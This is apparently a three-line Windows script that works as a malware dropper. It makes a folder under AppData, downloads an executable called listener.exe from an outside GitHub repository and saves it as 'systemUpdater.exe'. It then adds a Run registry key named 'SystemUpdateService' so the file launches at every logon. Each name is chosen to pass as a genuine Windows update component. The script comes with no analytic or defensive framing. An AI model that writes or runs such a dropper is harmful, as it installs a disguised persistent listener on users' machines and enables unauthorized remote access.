mkdir "$env:APPDATA\Microsoft\Windows\UpdateService" -Force

curl.exe -L "https://raw.githubusercontent.com/C5rsdMat1X5/middle-server-comms/refs/heads/master/execs/listener.exe" -o "$env:APPDATA\Microsoft\Windows\UpdateService\systemUpdater.exe"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdateService" /t REG_SZ /d "$env:APPDATA\Microsoft\Windows\UpdateService\systemUpdater.exe" /f
